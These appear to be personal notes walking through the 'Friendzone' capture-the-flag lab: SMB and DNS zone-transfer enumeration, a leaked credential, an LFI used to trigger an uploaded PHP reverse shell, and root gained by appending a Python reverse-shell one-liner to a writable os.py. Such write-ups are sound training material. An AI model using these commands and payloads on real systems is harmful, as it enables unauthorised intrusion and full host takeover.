![[Pasted image 20240720105026.png]]

**Ping**
![[Pasted image 20240704130949.png]]

**Nmap Scans**
```
mapit 10.10.10.123
```

Nmap Default Scan
![[Pasted image 20240704130959.png]]

Nmap Service and Script Scan
![[Pasted image 20240704131220.png]]
![[Pasted image 20240704131247.png]]
![[Pasted image 20240704131315.png]]

Nmap All port Scan
![[Pasted image 20240704131330.png]]

On Port 80 http://10.10.10.123
![[Pasted image 20240704131542.png]]

Smb Enumeration using Smbclient
```
smbclient -U '' -L \\\\10.10.10.123\\\\
```
![[Pasted image 20240704132217.png]]

if you can't access the share, play with slashes
```
smbclient \\\\10.10.10.123\\Development\\
```
![[Pasted image 20240704132254.png]]
Nothing in Development

Can't get cmd for Files

Share general
```
smbclient \\\\10.10.10.123\\general\\
```
![[Pasted image 20240704132408.png]]

Will analyse the file creds.txt
![[Pasted image 20240704132507.png]]
**admin:WORKWORKHhallelujah@#**

Will try this with ftp first
![[Pasted image 20240704132613.png]]
Didn't Work...!

Gobuster Scan
```
gobuster dir -u http://10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240704132641.png]]
We can see something interesting 

On http://10.10.10.123/robots.txt
![[Pasted image 20240704132740.png]]
hahahahahaha....:)

On http://10.10.10.123/wordpress
![[Pasted image 20240704135220.png]]
nothing here as well

But there is dns Port 53 is open, will find is there anymore domain names are there, because we have password for admin , we don't know where to use it.

Use this link for dns Enumeration:https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns

We can already see on nmap Scan, there is a domain name friendzone.red, will add this to our hosts file 
![[Pasted image 20240704140854.png]]
![[Pasted image 20240704140914.png]]

Will use dig to dig DNS
```
dig axfr @10.10.10.123 friendzone.red
```
![[Pasted image 20240704140929.png]]
Now we have lot of Domain names

Added all newly found domain names
![[Pasted image 20240704141032.png]]

On https://friendzone.red/
![[Pasted image 20240704141102.png]]

On https://administrator1.friendzone.red/
![[Pasted image 20240704141215.png]]

After login, it say's visit /dashboard.php
![[Pasted image 20240704141302.png]]
https://administrator1.friendzone.red/dashboard.php
![[Pasted image 20240704141409.png]]

On https://uploads.friendzone.red/
![[Pasted image 20240704141524.png]]

Nothing on hr
![[Pasted image 20240704141614.png]]

Uploaded a simple jpg file
![[Pasted image 20240704141726.png]]
![[Pasted image 20240704141715.png]]

Now will follow this
![[Pasted image 20240704141847.png]]


Will jump to Initial foothold....!

Will use the default 
https://administrator1.friendzone.red/dashboard.php?%20image_id=a.jpg&pagename=timestamp
![[Pasted image 20240704145305.png]]
I think pagename is vulnerable to LFI

We have already seen that the smb shares
![[Pasted image 20240704145438.png]]
So there might be chances for other two shares are in /etc

Will check that..!


Will put php reverse shell
![[Pasted image 20240704145835.png]]
Will trigger rev.php

It worked, but without extension https://administrator1.friendzone.red/dashboard.php?%2520image_id=a.jpg&pagename=/etc/Development/rev
![[Pasted image 20240704150013.png]]

Will check our listener
![[Pasted image 20240704150031.png]]

Upgraded my shell using python
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240704150253.png]]


**User.txt**
![[Pasted image 20240704150158.png]]



Will Jump to Privilege Escalation.....!

In have launched pspy and found this
![[Pasted image 20240704151846.png]]
reporter.py is run by root periodically

Will check that
![[Pasted image 20240704152046.png]]
It imports OS, I have already seen os.py while running linpeas.sh

![[Pasted image 20240704152149.png]]
So it is writable

Ok then will repalce the os.py with our reverse shell Oneliner
![[Pasted image 20240704152254.png]]

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' >> os.py
```
![[Pasted image 20240704153430.png]]
Added this at the end

And waited for shell as root and got it
![[Pasted image 20240704153515.png]]

**Root.txt**
![[Pasted image 20240704153605.png]]




Done with Friendzone....:)
